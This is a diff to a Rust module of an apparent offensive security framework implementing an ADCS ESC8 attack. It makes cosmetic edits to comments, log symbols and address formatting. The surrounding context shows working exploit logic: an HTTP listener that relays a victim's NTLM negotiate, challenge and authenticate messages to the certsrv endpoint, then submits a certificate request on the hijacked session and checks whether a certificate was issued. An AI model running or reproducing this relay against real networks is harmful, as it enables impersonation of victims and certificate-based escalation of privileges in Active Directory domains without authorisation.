@@ -1,4 +1,4 @@
-//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
+﻿//! ADCS ESC8 Relay — asynchronous NTLM relay to Active Directory Certificate Services.
 //!
 //! Listens for inbound HTTP connections on port 80, performs a 3-message NTLM relay
 //! to the target ADCS certsrv endpoint, and then POSTs a CSR on the authenticated
@@ -20,9 +20,9 @@ const IO_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(15);
 // Read buffer size — large enough for a full HTTP response with NTLM blob
 const BUF: usize = 16_384;
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Public API
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 #[derive(Debug, Clone)]
 /// Data structure used by this module.
@@ -61,7 +61,7 @@ impl AdcsRelay {
             return Err(RelayError::Config("ADCS Relay already running".into()).into());
         }
 
-        let listen_addr = format!("{}:80", self.config.listen_ip);
+        let listen_addr = crate::utils::format_addr(&self.config.listen_ip, 80);
         let listener = TcpListener::bind(&listen_addr)
             .await
             .map_err(|e| RelayError::Socket(format!("Failed to bind to {}: {}", listen_addr, e)))?;
@@ -118,9 +118,9 @@ impl AdcsRelay {
     }
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Per-connection handler
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 async fn handle_client(
     mut client: TcpStream,
@@ -171,8 +171,8 @@ async fn process_ntlm_relay(
 ) -> Result<()> {
     let ntlm_b64 = strip_ntlm_prefix(negotiate_header);
 
-    // ── Connect to ADCS target ──────────────────────────────
-    let target_addr = format!("{}:80", target_host);
+    // -- Connect to ADCS target ------------------------------
+    let target_addr = crate::utils::format_addr(target_host, 80);
     let mut target = tokio::time::timeout(IO_TIMEOUT, TcpStream::connect(&target_addr))
         .await
         .map_err(|_| RelayError::Network(format!("Timeout connecting to {}", target_addr)))?
@@ -180,13 +180,13 @@ async fn process_ntlm_relay(
 
     let mut buf = vec![0u8; BUF];
 
-    // ── Message 1: forward Negotiate to ADCS ───────────────
+    // -- Message 1: forward Negotiate to ADCS ---------------
     let nego_req = format!(
         "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {target_host}\r\nAuthorization: NTLM {ntlm_b64}\r\nConnection: keep-alive\r\n\r\n"
     );
     timed_write(&mut target, nego_req.as_bytes()).await?;
 
-    // ── Message 2: read NTLM Challenge from ADCS ───────────
+    // -- Message 2: read NTLM Challenge from ADCS -----------
     let n = timed_read(&mut target, &mut buf).await?;
     let resp = String::from_utf8_lossy(&buf[..n]);
 
@@ -196,13 +196,13 @@ async fn process_ntlm_relay(
         .ok_or_else(|| RelayError::Protocol("ADCS did not return NTLM challenge".into()))?;
     let challenge_b64 = strip_ntlm_prefix(challenge_hdr);
 
-    // ── Forward Challenge to victim ─────────────────────────
+    // -- Forward Challenge to victim -------------------------
     let chall_resp = format!(
         "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM {challenge_b64}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\n"
     );
     timed_write(client, chall_resp.as_bytes()).await?;
 
-    // ── Message 3: read Authenticate from victim ───────────
+    // -- Message 3: read Authenticate from victim -----------
     let n2 = timed_read(client, &mut buf).await?;
     let req = String::from_utf8_lossy(&buf[..n2]);
     let auth_hdr = req
@@ -211,7 +211,7 @@ async fn process_ntlm_relay(
         .ok_or_else(|| RelayError::Protocol("Victim did not send NTLM Authenticate".into()))?;
     let auth_b64 = strip_ntlm_prefix(auth_hdr);
 
-    // ── Forward Authenticate to ADCS ───────────────────────
+    // -- Forward Authenticate to ADCS -----------------------
     // We use the same TCP connection (HTTP Keep-Alive) so the auth sticks.
     let auth_req = format!(
         "GET /certsrv/certfnsh.asp HTTP/1.1\r\nHost: {target_host}\r\nAuthorization: NTLM {auth_b64}\r\nConnection: keep-alive\r\n\r\n"
@@ -230,11 +230,11 @@ async fn process_ntlm_relay(
     }
     info!("ESC8: authenticated to ADCS {} via NTLM relay", target_host);
 
-    // ── Notify victim: done ─────────────────────────────────
+    // -- Notify victim: done ---------------------------------
     let done = "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 0\r\n\r\n";
     let _ = timed_write(client, done.as_bytes()).await;
 
-    // ── POST CSR on authenticated connection ───────────────
+    // -- POST CSR on authenticated connection ---------------
     let csr = build_csr(target_upn.as_deref());
     let body = format!(
         "Mode=newreq&CertRequest={}&CertAttrib=CertificateTemplate:{}&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=",
@@ -259,7 +259,7 @@ async fn process_ntlm_relay(
 
     info!("ESC8: ADCS CSR response received ({} bytes)", n4);
     if final_resp.contains("certnew.cer?ReqID=") || final_resp.contains("BEGIN CERTIFICATE") {
-        info!("ESC8: ✓ Certificate issued via ESC8 relay!");
+        info!("ESC8: [+] Certificate issued via ESC8 relay!");
     } else if final_resp.contains("disposed of") || final_resp.contains("denied") {
         warn!("ESC8: Certificate request was denied by the CA");
     } else {
@@ -269,9 +269,9 @@ async fn process_ntlm_relay(
     Ok(())
 }
 
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 // Async I/O helpers
-// ─────────────────────────────────────────────────────────────
+// -------------------------------------------------------------
 
 async fn timed_read(stream: &mut TcpStream, buf: &mut [u8]) -> Result<usize> {
     tokio::time::timeout(IO_TIMEOUT, stream.read(buf))
